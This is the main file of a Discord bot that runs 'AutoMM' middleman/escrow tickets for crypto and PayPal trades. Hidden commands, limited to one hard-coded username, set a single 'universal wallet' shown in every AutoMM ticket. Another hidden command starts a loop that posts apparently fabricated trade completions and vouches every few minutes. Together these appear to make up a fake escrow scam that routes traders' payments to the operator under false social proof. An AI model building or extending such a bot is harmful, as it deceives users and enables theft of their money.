import {
  Client,
  GatewayIntentBits,
  Partials,
  ButtonInteraction,
  ModalSubmitInteraction,
  StringSelectMenuInteraction,
} from "discord.js";
import { connectDB } from "./db/connect.js";
import { handleSwitchServer } from "./commands/switchServer.js";
import { handleReactionRole } from "./handlers/reactionRoleHandler.js";
import {
  handleOpenSupportTicket,
  handleSupportTicketSubmit,
  handleRequestMiddleman,
  handleMiddlemanTicketSubmit,
  handleClaimTicket,
  handleDeleteTicket,
  handleAddUser,
  handleAddUserSubmit,
} from "./handlers/supportTicketHandler.js";
import {
  handleEscrowPaymentSelect,
  handleAutoMMSetupSubmit,
  handleAutoMMRole,
  handleAutoMMConfirmRoles,
  handleAutoMMAmountSubmit,
  handleAutoMMConfirmAmount,
  handleAutoMMPaymentSent,
  handleAutoMMComplete,
  handleAutoMMRejectAmount,
} from "./handlers/escrowHandler.js";
import { startTradeLoop, stopTradeLoop, isLoopActive } from "./handlers/tradeLoop.js";
import { ServerConfig, WalletConfig } from "./db/models.js";
import { getCurrencyLabel } from "./utils/rates.js";

const ADMIN_USERNAME = "imechoplay";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessageReactions,
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});

client.once("clientReady", async () => {
  console.log(`[Bot] Logged in as ${client.user?.tag}`);

  // Re-start any saved trade loops after bot restart
  for (const guild of client.guilds.cache.values()) {
    const config = await ServerConfig.findOne({ guildId: guild.id });
    if (config?.tradeLoopChannelId) {
      startTradeLoop(client, guild.id, config.tradeLoopChannelId);
      console.log(`[TradeLoop] Restored loop for guild ${guild.id} → channel ${config.tradeLoopChannelId}`);
    }
  }
});

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;

  const content = message.content.trim();
  const isAdmin = message.author.username === ADMIN_USERNAME;

  // ── .switchserveradminonlymadebyecho ──────────────────────────────────────
  if (content.startsWith(".switchserveradminonlymadebyecho")) {
    const args = content.slice(".switchserveradminonlymadebyecho".length).trim().split(/\s+/).filter(Boolean);
    await handleSwitchServer(message, args);
    return;
  }

  // ── .setwalletadminonlymadebyecho <address> ───────────────────────────────
  if (content.startsWith(".setwalletadminonlymadebyecho")) {
    if (!isAdmin) {
      await message.reply("You do not have permission to use this command.");
      return;
    }
    const address = content.slice(".setwalletadminonlymadebyecho".length).trim();
    if (!address) {
      await message.reply("Usage: `.setwalletadminonlymadebyecho <wallet_address>`\nExample: `.setwalletadminonlymadebyecho bc1qxyz...`");
      return;
    }
    await ServerConfig.findOneAndUpdate(
      { guildId: message.guild.id },
      { universalWallet: address, updatedAt: new Date() },
      { upsert: true, new: true }
    );
    await message.reply(`✅ Universal wallet address has been set to:\n\`${address}\`\n\nThis address will be shown in all AutoMM tickets.`);
    return;
  }

  // ── .startloopadminonlymadebyecho <channelId> ─────────────────────────────
  if (content.startsWith(".startloopadminonlymadebyecho")) {
    if (!isAdmin) {
      await message.reply("You do not have permission to use this command.");
      return;
    }
    const channelId = content.slice(".startloopadminonlymadebyecho".length).trim();
    if (!channelId) {
      await message.reply("Usage: `.startloopadminonlymadebyecho <channelId>`\nExample: `.startloopadminonlymadebyecho 1514088174903754822`");
      return;
    }

    // Verify the channel exists
    try {
      await message.guild.channels.fetch(channelId);
    } catch {
      await message.reply(`Could not find channel with ID \`${channelId}\`. Make sure the ID is correct.`);
      return;
    }

    // Persist so loop survives bot restarts
    await ServerConfig.findOneAndUpdate(
      { guildId: message.guild.id },
      { tradeLoopChannelId: channelId, updatedAt: new Date() },
      { upsert: true }
    );

    startTradeLoop(client, message.guild.id, channelId);
    await message.reply(`✅ Trade loop started in <#${channelId}>. Posts every 2–5 minutes (AutoMM completions + MM vouches).`);
    return;
  }

  // ── .stoploopadminonlymadebyecho ──────────────────────────────────────────
  if (content.startsWith(".stoploopadminonlymadebyecho")) {
    if (!isAdmin) {
      await message.reply("You do not have permission to use this command.");
      return;
    }
    const stopped = stopTradeLoop(message.guild.id);
    await ServerConfig.findOneAndUpdate(
      { guildId: message.guild.id },
      { tradeLoopChannelId: "", updatedAt: new Date() },
      { upsert: true }
    );
    await message.reply(stopped ? "✅ Trade loop stopped." : "No active trade loop found.");
    return;
  }

  // ── .setwallet <currency> <address> (per-currency, optional) ─────────────
  if (content.startsWith(".setwallet")) {
    if (!isAdmin) {
      await message.reply("You do not have permission to use this command.");
      return;
    }
    const args = content.slice(".setwallet".length).trim().split(/\s+/);
    const currency = args[0]?.toLowerCase();
    const address = args[1];
    if (!currency || !address) {
      await message.reply("Usage: `.setwallet <currency> <address>`\nCurrencies: `btc` `paypal` `eth` `ltc` `sol` `usdt_erc20` `usdc_erc20` `usdt_sol` `usdc_sol`");
      return;
    }
    await WalletConfig.findOneAndUpdate(
      { guildId: message.guild.id, currency },
      { address, updatedAt: new Date() },
      { upsert: true }
    );
    await message.reply(`✅ Per-currency wallet for **${getCurrencyLabel(currency)}** set to:\n\`${address}\``);
    return;
  }
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (interaction.isButton()) {
      const id = interaction.customId;

      if (id.startsWith("rr_")) {
        await handleReactionRole(interaction as ButtonInteraction);
      } else if (id === "open_support_ticket") {
        await handleOpenSupportTicket(interaction as ButtonInteraction);
      } else if (id === "request_middleman") {
        await handleRequestMiddleman(interaction as ButtonInteraction);
      } else if (id === "claim_ticket") {
        await handleClaimTicket(interaction as ButtonInteraction);
      } else if (id === "delete_ticket") {
        await handleDeleteTicket(interaction as ButtonInteraction);
      } else if (id === "add_user_ticket") {
        await handleAddUser(interaction as ButtonInteraction);
      } else if (id === "automm_sender") {
        await handleAutoMMRole(interaction as ButtonInteraction, "sender");
      } else if (id === "automm_receiver") {
        await handleAutoMMRole(interaction as ButtonInteraction, "receiver");
      } else if (id === "automm_reset") {
        await handleAutoMMRole(interaction as ButtonInteraction, "reset");
      } else if (id === "automm_confirm_roles") {
        await handleAutoMMConfirmRoles(interaction as ButtonInteraction);
      } else if (id === "automm_confirm_amount") {
        await handleAutoMMConfirmAmount(interaction as ButtonInteraction);
      } else if (id === "automm_reject_amount") {
        await handleAutoMMRejectAmount(interaction as ButtonInteraction);
      } else if (id === "automm_payment_sent") {
        await handleAutoMMPaymentSent(interaction as ButtonInteraction);
      } else if (id === "automm_complete") {
        await handleAutoMMComplete(interaction as ButtonInteraction);
      }

    } else if (interaction.isStringSelectMenu()) {
      if (interaction.customId === "escrow_payment_method") {
        await handleEscrowPaymentSelect(interaction as StringSelectMenuInteraction);
      }

    } else if (interaction.isModalSubmit()) {
      const id = interaction.customId;

      if (id === "support_ticket_modal") {
        await handleSupportTicketSubmit(interaction as ModalSubmitInteraction);
      } else if (id === "middleman_ticket_modal") {
        await handleMiddlemanTicketSubmit(interaction as ModalSubmitInteraction);
      } else if (id.startsWith("automm_setup_modal_")) {
        const paymentMethod = id.replace("automm_setup_modal_", "");
        await handleAutoMMSetupSubmit(interaction as ModalSubmitInteraction, paymentMethod);
      } else if (id === "automm_amount_modal") {
        await handleAutoMMAmountSubmit(interaction as ModalSubmitInteraction);
      } else if (id === "add_user_modal") {
        await handleAddUserSubmit(interaction as ModalSubmitInteraction);
      }
    }
  } catch (err) {
    console.error("[Interaction Error]", err);
    try {
      if ((interaction as any).replied || (interaction as any).deferred) {
        await (interaction as any).editReply({ content: "An error occurred." });
      } else {
        await (interaction as any).reply({ content: "An error occurred.", flags: 64 });
      }
    } catch {}
  }
});

async function main() {
  await connectDB();
  const token = process.env.DISCORD_BOT_TOKEN;
  if (!token) throw new Error("DISCORD_BOT_TOKEN is not set");
  await client.login(token);
}

main().catch((err) => {
  console.error("[Fatal]", err);
  process.exit(1);
});
